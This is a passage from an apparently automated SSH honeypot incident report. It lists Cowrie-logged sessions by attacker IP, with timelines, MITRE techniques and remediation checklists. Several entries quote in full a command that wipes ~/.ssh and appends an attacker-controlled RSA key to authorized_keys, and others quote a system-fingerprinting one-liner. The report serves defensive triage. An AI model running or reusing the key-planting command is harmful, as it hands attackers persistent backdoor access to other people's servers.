| `2026-08-04 03:39:21` | `cowrie.client.kex` |
| `2026-08-04 03:39:21` | `cowrie.login.success` |
| `2026-08-04 03:39:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9606f3f87a48

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 03:39 |
| **Last Seen** | 2026-08-04 03:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:39:26` | `cowrie.session.connect` |
| `2026-08-04 03:39:26` | `cowrie.client.version` |
| `2026-08-04 03:39:26` | `cowrie.client.kex` |
| `2026-08-04 03:39:26` | `cowrie.login.success` |
| `2026-08-04 03:39:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10bcfc54a65f

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-04 03:39 |
| **Last Seen** | 2026-08-04 03:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:39:26` | `cowrie.session.connect` |
| `2026-08-04 03:39:26` | `cowrie.client.version` |
| `2026-08-04 03:39:26` | `cowrie.client.kex` |
| `2026-08-04 03:39:26` | `cowrie.login.success` |
| `2026-08-04 03:39:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72e8462f02eb

| Field | Detail |
|---|---|
| **Source IP** | `155.212.17[.]174` |
| **First Seen** | 2026-08-04 03:42 |
| **Last Seen** | 2026-08-04 03:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:42:36` | `cowrie.session.connect` |
| `2026-08-04 03:42:36` | `cowrie.client.version` |
| `2026-08-04 03:42:36` | `cowrie.client.kex` |
| `2026-08-04 03:42:37` | `cowrie.login.success` |
| `2026-08-04 03:42:37` | `cowrie.direct-tcpip.request` |
| `2026-08-04 03:42:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `155.212.17[.]174` to AbuseIPDB if not already reported
- [ ] Block `155.212.17[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65445d3753af

| Field | Detail |
|---|---|
| **Source IP** | `120.48.26[.]185` |
| **First Seen** | 2026-08-04 03:42 |
| **Last Seen** | 2026-08-04 03:46 |
| **Session Duration** | 250s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:42:39` | `cowrie.session.connect` |
| `2026-08-04 03:42:39` | `cowrie.client.version` |
| `2026-08-04 03:42:39` | `cowrie.client.kex` |
| `2026-08-04 03:42:40` | `cowrie.login.success` |
| `2026-08-04 03:42:41` | `cowrie.session.params` |
| `2026-08-04 03:42:41` | `cowrie.command.input` |
| `2026-08-04 03:42:41` | `cowrie.command.failed` |
| `2026-08-04 03:42:42` | `cowrie.log.closed` |
| `2026-08-04 03:46:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.26[.]185` to AbuseIPDB if not already reported
- [ ] Block `120.48.26[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-134f198d8549

| Field | Detail |
|---|---|
| **Source IP** | `120.48.26[.]185` |
| **First Seen** | 2026-08-04 03:42 |
| **Last Seen** | 2026-08-04 03:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:42:50` | `cowrie.session.connect` |
| `2026-08-04 03:42:50` | `cowrie.client.version` |
| `2026-08-04 03:42:51` | `cowrie.client.kex` |
| `2026-08-04 03:42:52` | `cowrie.login.success` |
| `2026-08-04 03:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.26[.]185` to AbuseIPDB if not already reported
- [ ] Block `120.48.26[.]185` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad1128d37bbc

| Field | Detail |
|---|---|
| **Source IP** | `157.230.52[.]12` |
| **First Seen** | 2026-08-04 03:44 |
| **Last Seen** | 2026-08-04 03:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:44:35` | `cowrie.session.connect` |
| `2026-08-04 03:44:35` | `cowrie.client.version` |
| `2026-08-04 03:44:35` | `cowrie.client.kex` |
| `2026-08-04 03:44:35` | `cowrie.login.success` |
| `2026-08-04 03:44:36` | `cowrie.session.params` |
| `2026-08-04 03:44:36` | `cowrie.command.input` |
| `2026-08-04 03:44:36` | `cowrie.command.failed` |
| `2026-08-04 03:44:36` | `cowrie.log.closed` |
| `2026-08-04 03:44:37` | `cowrie.session.params` |
| `2026-08-04 03:44:37` | `cowrie.command.input` |
| `2026-08-04 03:44:37` | `cowrie.session.file_download` |
| `2026-08-04 03:44:37` | `cowrie.log.closed` |
| `2026-08-04 03:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.230.52[.]12` to AbuseIPDB if not already reported
- [ ] Block `157.230.52[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51b62f406abf

| Field | Detail |
|---|---|
| **Source IP** | `157.230.52[.]12` |
| **First Seen** | 2026-08-04 03:44 |
| **Last Seen** | 2026-08-04 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:44:37` | `cowrie.session.connect` |
| `2026-08-04 03:44:37` | `cowrie.client.version` |
| `2026-08-04 03:44:37` | `cowrie.client.kex` |
| `2026-08-04 03:44:37` | `cowrie.login.success` |
| `2026-08-04 03:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.230.52[.]12` to AbuseIPDB if not already reported
- [ ] Block `157.230.52[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0f1fee4a870

| Field | Detail |
|---|---|
| **Source IP** | `157.230.52[.]12` |
| **First Seen** | 2026-08-04 03:44 |
| **Last Seen** | 2026-08-04 03:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:44:37` | `cowrie.session.connect` |
| `2026-08-04 03:44:37` | `cowrie.client.version` |
| `2026-08-04 03:44:37` | `cowrie.client.kex` |
| `2026-08-04 03:44:37` | `cowrie.login.success` |
| `2026-08-04 03:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.230.52[.]12` to AbuseIPDB if not already reported
- [ ] Block `157.230.52[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13590843f566

| Field | Detail |
|---|---|
| **Source IP** | `74.208.177[.]56` |
| **First Seen** | 2026-08-04 03:44 |
| **Last Seen** | 2026-08-04 03:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:44:38` | `cowrie.session.connect` |
| `2026-08-04 03:44:38` | `cowrie.client.version` |
| `2026-08-04 03:44:38` | `cowrie.client.kex` |
| `2026-08-04 03:44:39` | `cowrie.login.success` |
| `2026-08-04 03:44:39` | `cowrie.direct-tcpip.request` |
| `2026-08-04 03:44:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `74.208.177[.]56` to AbuseIPDB if not already reported
- [ ] Block `74.208.177[.]56` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d49e0b10b49

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-08-04 03:44 |
| **Last Seen** | 2026-08-04 03:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:44:44` | `cowrie.session.connect` |
| `2026-08-04 03:44:45` | `cowrie.client.version` |
| `2026-08-04 03:44:45` | `cowrie.client.kex` |
| `2026-08-04 03:44:46` | `cowrie.login.success` |
| `2026-08-04 03:44:46` | `cowrie.direct-tcpip.request` |
| `2026-08-04 03:44:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e58f9babacf

| Field | Detail |
|---|---|
| **Source IP** | `130.211.103[.]2` |
| **First Seen** | 2026-08-04 03:46 |
| **Last Seen** | 2026-08-04 03:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:46:59` | `cowrie.session.connect` |
| `2026-08-04 03:46:59` | `cowrie.client.version` |
| `2026-08-04 03:46:59` | `cowrie.client.kex` |
| `2026-08-04 03:47:02` | `cowrie.login.success` |
| `2026-08-04 03:47:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.211.103[.]2` to AbuseIPDB if not already reported
- [ ] Block `130.211.103[.]2` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f18cbe03949

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-04 03:59 |
| **Last Seen** | 2026-08-04 03:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 03:59:14` | `cowrie.session.connect` |
| `2026-08-04 03:59:14` | `cowrie.client.version` |
| `2026-08-04 03:59:14` | `cowrie.client.kex` |
| `2026-08-04 03:59:15` | `cowrie.login.success` |
| `2026-08-04 03:59:15` | `cowrie.direct-tcpip.request` |
| `2026-08-04 03:59:15` | `cowrie.direct-tcpip.data` |
| `2026-08-04 03:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f7e229ca706

| Field | Detail |
|---|---|
| **Source IP** | `182.253.64[.]224` |
| **First Seen** | 2026-08-04 04:06 |
| **Last Seen** | 2026-08-04 04:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:06:54` | `cowrie.session.connect` |
| `2026-08-04 04:06:54` | `cowrie.client.version` |
| `2026-08-04 04:06:55` | `cowrie.client.kex` |
| `2026-08-04 04:06:56` | `cowrie.login.success` |
| `2026-08-04 04:06:57` | `cowrie.session.params` |
| `2026-08-04 04:06:57` | `cowrie.command.input` |
| `2026-08-04 04:06:57` | `cowrie.command.failed` |
| `2026-08-04 04:06:58` | `cowrie.log.closed` |
| `2026-08-04 04:06:59` | `cowrie.session.params` |
| `2026-08-04 04:06:59` | `cowrie.command.input` |
| `2026-08-04 04:06:59` | `cowrie.session.file_download` |
| `2026-08-04 04:06:59` | `cowrie.log.closed` |
| `2026-08-04 04:07:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.64[.]224` to AbuseIPDB if not already reported
- [ ] Block `182.253.64[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28398dbaee21

| Field | Detail |
|---|---|
| **Source IP** | `182.253.64[.]224` |
| **First Seen** | 2026-08-04 04:06 |
| **Last Seen** | 2026-08-04 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:06:59` | `cowrie.session.connect` |
| `2026-08-04 04:06:59` | `cowrie.client.version` |
| `2026-08-04 04:06:59` | `cowrie.client.kex` |
| `2026-08-04 04:07:00` | `cowrie.login.success` |
| `2026-08-04 04:07:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.64[.]224` to AbuseIPDB if not already reported
- [ ] Block `182.253.64[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85e96913eaad

| Field | Detail |
|---|---|
| **Source IP** | `182.253.64[.]224` |
| **First Seen** | 2026-08-04 04:07 |
| **Last Seen** | 2026-08-04 04:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:07:01` | `cowrie.session.connect` |
| `2026-08-04 04:07:01` | `cowrie.client.version` |
| `2026-08-04 04:07:01` | `cowrie.client.kex` |
| `2026-08-04 04:07:02` | `cowrie.login.success` |
| `2026-08-04 04:07:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.253.64[.]224` to AbuseIPDB if not already reported
- [ ] Block `182.253.64[.]224` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9e5fb655467

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-04 04:08 |
| **Last Seen** | 2026-08-04 04:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:08:00` | `cowrie.session.connect` |
| `2026-08-04 04:08:00` | `cowrie.client.version` |
| `2026-08-04 04:08:00` | `cowrie.client.kex` |
| `2026-08-04 04:08:02` | `cowrie.login.success` |
| `2026-08-04 04:08:03` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:08:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a4c202b8f71

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-08-04 04:08 |
| **Last Seen** | 2026-08-04 04:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:08:08` | `cowrie.session.connect` |
| `2026-08-04 04:08:09` | `cowrie.client.version` |
| `2026-08-04 04:08:09` | `cowrie.client.kex` |
| `2026-08-04 04:08:11` | `cowrie.login.success` |
| `2026-08-04 04:08:11` | `cowrie.direct-tcpip.request` |
| `2026-08-04 04:08:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b7d3ad6d4bf

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-08-04 04:08 |
| **Last Seen** | 2026-08-04 04:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:08:24` | `cowrie.session.connect` |
| `2026-08-04 04:08:24` | `cowrie.client.version` |
| `2026-08-04 04:08:25` | `cowrie.client.kex` |
| `2026-08-04 04:08:26` | `cowrie.login.success` |
| `2026-08-04 04:08:27` | `cowrie.session.params` |
| `2026-08-04 04:08:27` | `cowrie.command.input` |
| `2026-08-04 04:08:27` | `cowrie.command.failed` |
| `2026-08-04 04:08:27` | `cowrie.log.closed` |
| `2026-08-04 04:08:28` | `cowrie.session.params` |
| `2026-08-04 04:08:28` | `cowrie.command.input` |
| `2026-08-04 04:08:28` | `cowrie.session.file_download` |
| `2026-08-04 04:08:28` | `cowrie.log.closed` |
| `2026-08-04 04:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67c28b88f19d

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-08-04 04:08 |
| **Last Seen** | 2026-08-04 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:08:29` | `cowrie.session.connect` |
| `2026-08-04 04:08:29` | `cowrie.client.version` |
| `2026-08-04 04:08:29` | `cowrie.client.kex` |
| `2026-08-04 04:08:30` | `cowrie.login.success` |
| `2026-08-04 04:08:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd4fb7cb6a89

| Field | Detail |
|---|---|
| **Source IP** | `103.97.101[.]25` |
| **First Seen** | 2026-08-04 04:08 |
| **Last Seen** | 2026-08-04 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:08:30` | `cowrie.session.connect` |
| `2026-08-04 04:08:30` | `cowrie.client.version` |
| `2026-08-04 04:08:31` | `cowrie.client.kex` |
| `2026-08-04 04:08:32` | `cowrie.login.success` |
| `2026-08-04 04:08:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.97.101[.]25` to AbuseIPDB if not already reported
- [ ] Block `103.97.101[.]25` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8020745864c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:08 |
| **Last Seen** | 2026-08-04 04:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:08:48` | `cowrie.session.connect` |
| `2026-08-04 04:08:48` | `cowrie.client.version` |
| `2026-08-04 04:08:48` | `cowrie.client.kex` |
| `2026-08-04 04:08:51` | `cowrie.login.success` |
| `2026-08-04 04:08:52` | `cowrie.session.params` |
| `2026-08-04 04:08:52` | `cowrie.command.input` |
| `2026-08-04 04:08:52` | `cowrie.command.input` |
| `2026-08-04 04:08:52` | `cowrie.command.input` |
| `2026-08-04 04:08:52` | `cowrie.command.input` |
| `2026-08-04 04:08:52` | `cowrie.command.input` |
| `2026-08-04 04:08:52` | `cowrie.command.success` |
| `2026-08-04 04:08:52` | `cowrie.command.input` |
| `2026-08-04 04:08:52` | `cowrie.command.input` |
| `2026-08-04 04:08:52` | `cowrie.command.input` |
| `2026-08-04 04:08:52` | `cowrie.command.input` |
| `2026-08-04 04:08:53` | `cowrie.log.closed` |
| `2026-08-04 04:08:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02c72d11136

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-04 04:10 |
| **Last Seen** | 2026-08-04 04:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 04:10:52` | `cowrie.session.connect` |
| `2026-08-04 04:10:53` | `cowrie.client.version` |
| `2026-08-04 04:10:53` | `cowrie.client.kex` |
| `2026-08-04 04:10:55` | `cowrie.login.success` |
| `2026-08-04 04:10:57` | `cowrie.session.params` |
| `2026-08-04 04:10:57` | `cowrie.command.input` |
| `2026-08-04 04:10:57` | `cowrie.command.input` |
| `2026-08-04 04:10:57` | `cowrie.command.input` |
| `2026-08-04 04:10:57` | `cowrie.command.input` |
| `2026-08-04 04:10:57` | `cowrie.command.input` |
| `2026-08-04 04:10:57` | `cowrie.command.success` |
| `2026-08-04 04:10:57` | `cowrie.command.input` |
